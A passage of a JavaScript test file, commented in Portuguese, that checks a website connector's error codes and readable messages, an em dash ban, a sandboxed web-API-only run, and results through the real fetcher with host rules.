 // Antes, partes.pagespeed.motivo era "sem_chave" e a tela mostrava isso.
 const frase=(m)=>typeof m==='string'&&m.length>12&&!/^[a-z0-9_]+$/.test(m)&&/[.]$/.test(m)&&!TRAVESSAO.test(m)&&!/\b[a-z]+_[a-z_]+\b/.test(m);
 const casos=[{chave:null},{prazo:()=>0},{google:{crux:()=>fj('erro-cota.json')}},{google:{psi:()=>fj('erro-api-desativada.json')}},
  {chave:null,rotas:{[`${O}/`]:{status:403,corpo:'<html>negado</html>',headers:{}},[`${O}/robots.txt`]:{status:500,corpo:'x',headers:{}}}},
  {canais:[{codigo:'site',url_perfil:'https://192.168.0.10'}]}];
 let vistos=0;
 for(const m of casos){
  const r=await coletar(montar(m).ctx);
  for(const [nome,p] of Object.entries(r.partes)){
   if(!('codigo' in p)){assert.equal('motivo' in p,false,`${nome}: motivo sem código`);continue;}
   vistos++;
   assert.match(p.codigo,/^[a-z0-9_]+$/,nome);
   assert.ok(frase(p.motivo),`${nome}: "${p.motivo}" não é frase para gente`);
   assert.notEqual(p.motivo,p.codigo);
  }
 }
 assert.ok(vistos>=15,`poucos motivos conferidos: ${vistos}`);
 // Todo código do FORMATO tem frase própria (nenhum cai na frase genérica).
 const generica=site.fraseDoMotivo('codigo_que_nao_existe');
 for(const c of ['sem_endereco','sem_chave','chave_recusada','api_bloqueada','prazo','cota','servidor','sem_resposta','recusado','sem_dados','medicao_falhou','grande_demais','http_503','rede','certificado','tempo_esgotado','dns','laco','saltos_demais','redireciona_para_fora','fora_do_dominio','limite_paginas','nao_e_sitemap','rest_fechada','sem_wordpress','algumas_paginas','nada_a_conferir','ip_interno','sem_ip','falha_interna']){
  const f=site.fraseDoMotivo(c,'paginas');
  assert.ok(frase(f)&&f!==generica,`${c}: ${f}`);
 }
 assert.equal(site.fraseDoMotivo('http_404'),'O site respondeu com erro 404.');
 assert.equal(site.fraseDoMotivo('sem_resposta','dns'),'O DNS público do Google não respondeu desta vez.');
 assert.equal(site.fraseDoMotivo('tempo_esgotado','dns'),'O DNS público do Google não respondeu a tempo.');
 assert.equal(site.fraseDoMotivo('tempo_esgotado','paginas'),'O site não respondeu a tempo.');
 assert.ok(frase(generica));
});

test('nenhum travessão: nem no código, nem nos avisos, nem nas conferências, nem nos motivos', async()=>{
 const fonte=readFileSync(new URL('../supabase/functions/_shared/mkt-fontes/site.mjs',import.meta.url),'utf8');
 assert.equal(TRAVESSAO.test('a \u2014 b'),true); // a guarda pega o que tem de pegar
 assert.equal(TRAVESSAO.test(fonte),false);
 for(const montagem of [{},{chave:null},{google:{crux:()=>fj('erro-chave-invalida.json')}},{prazo:()=>20_000},{google:{psi:()=>fj('erro-api-desativada.json')}}]){
  const r=await coletar(montar(montagem).ctx);
  for(const a of r.avisos)assert.ok(!TRAVESSAO.test(a),a);
  for(const c of r.dados.conferencias)assert.ok(!TRAVESSAO.test(c.texto),c.texto);
  for(const p of Object.values(r.partes))assert.ok(!TRAVESSAO.test(p.motivo??''));
 }
});

test('roda sem nada do Node (como no Deno): o mesmo conector, empacotado e rodado num vm só com APIs da web, dá o mesmo resultado', async()=>{
 const require=createRequire(import.meta.url),{buildSync}=createRequire(require.resolve('vite'))('esbuild');
 const code=buildSync({entryPoints:[fileURLToPath(new URL('../supabase/functions/_shared/mkt-fontes/site.mjs',import.meta.url))],bundle:true,write:false,format:'iife',globalName:'conector',platform:'neutral'}).outputFiles[0].text;
 assert.ok(!/\brequire\(|process\.|Buffer\b/.test(code),'usou API do Node');
 // Só o que o Deno também tem. Nada de process, Buffer, require.
 const contexto={URL,URLSearchParams,TextDecoder,TextEncoder,atob,btoa,AbortSignal,Response,Headers,ReadableStream,crypto,console,setTimeout,clearTimeout};
 const mod=vm.runInNewContext(`${code};conector`,contexto);
 const t1=montar(),t2=montar();
 const [fora,dentro]=await Promise.all([coletar(t1.ctx),mod.coletar(t2.ctx)]);
 assert.deepEqual(tirarTempo(dentro),tirarTempo(fora));
 assert.equal(simples(dentro).estado,'ok');
});

test('integração: pelo buscador DE VERDADE da coletora (hosts da fonte, ErroFonte, redirect manual), o resultado é o mesmo', async()=>{
 const {criarBuscador:buscadorDaColetora,regraDeHosts}=await import('../supabase/functions/_shared/mkt-fontes/coletora.mjs');
 const rodar=async(google)=>{
  const t=montar({google});
  // A "rede" de baixo: o Google, o DNS e o WordPress.org pelo falso do Google; o resto, o site.
  const rede=(url,init)=>(/\.googleapis\.com$|^dns\.google$|^api\.wordpress\.org$/.test(new URL(url).hostname)?t.g.fetch(url,init):t.s.fetch(url,init));
  let idas=0;
  const b=buscadorDaColetora({fetch:rede,regra:regraDeHosts('site',t.ctx.canais),prazo:()=>100_000,contar:()=>idas++,esperar:async()=>{}});
  return {r:await coletar({...t.ctx,fetchJson:b.fetchJson,fetchTexto:b.fetchTexto,fetch:b.fetch}),idas,t};
 };
 const {r,idas,t}=await rodar();
 assert.deepEqual(tirarTempo(r),tirarTempo(await coletar(montar().ctx)));
 assert.equal(idas,t.s.pedidos.length+t.g.chamadas.length); // tudo passou pela coletora e foi contado
 // Os erros do Google chegam como ErroFonte da coletora e são lidos igual.
 const ruim=await rodar({crux:()=>fj('erro-chave-invalida.json')});
 assert.deepEqual([ruim.r.partes.crux.codigo,ruim.r.partes.pagespeed.codigo],['chave_recusada','chave_recusada']);
 assert.equal(doPsi(ruim.t.g).length,0);
 const vazio=await rodar({crux:()=>fj('erro-crux-sem-dados.json')});
 assert.deepEqual([vazio.r.partes.crux.estado,vazio.r.partes.crux.codigo],['ok','sem_dados']);
 semSegredo(ruim.t,ruim.r);
});
